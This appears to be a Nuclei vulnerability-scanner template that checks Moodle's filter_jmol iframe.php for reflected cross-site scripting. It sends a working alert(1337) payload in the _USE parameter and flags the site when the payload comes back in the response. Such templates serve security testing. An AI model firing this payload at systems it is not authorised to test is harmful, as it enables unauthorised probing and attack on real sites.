id: moodle-filter-jmol-xss

info:
  name: Moodle filter_jmol - XSS
  author: madrobot
  severity: medium
  description: Cross-site scripting on Moodle.
  tags: moodle,xss

requests:
  - method: GET
    path:
      - "{{BaseURL}}/filter/jmol/iframe.php?_USE=%22};alert(1337);//"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '\"};alert(1337);//'
        part: body
